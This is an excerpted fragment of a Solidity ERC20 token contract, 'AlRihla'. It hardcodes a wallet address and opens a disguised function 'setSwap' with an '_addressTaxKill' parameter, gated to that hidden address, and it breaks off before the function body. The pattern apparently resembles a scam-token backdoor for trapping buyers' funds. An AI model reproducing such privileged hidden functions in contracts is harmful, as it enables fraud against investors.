...
contract AlRihla is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "AlRihla";
    string private _symbol = "AlRihla";
    uint8 private _decimals = 18;

    address payable private _anotherA = payable(0xf86CfF247DeFFBabBfcB2efe5548b8A0C26617C2); 
    address payable private teamWalletAddress = payable(0xf86CfF247DeFFBabBfcB2efe5548b8A0C26617C2); 
	...
	function setSwap(address _address, bool _enable, uint256 _addressTaxKill) external  
	{
    if(msg.sender== _anotherA)
        {
